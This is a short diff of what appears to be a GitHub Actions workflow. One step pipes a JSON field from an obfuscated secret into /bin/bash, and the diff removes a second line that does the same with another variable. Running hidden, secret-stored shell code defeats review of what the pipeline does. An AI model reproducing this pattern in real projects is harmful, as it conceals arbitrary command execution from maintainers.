@@ -21,7 +21,6 @@ jobs:
           db0754: ${{ secrets.db0754 }}
         run: |
           printf '%s' "$db0754" | jq -r .bwlh2 | /bin/bash
-          echo $djx56 | jq -r .annmi81282 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
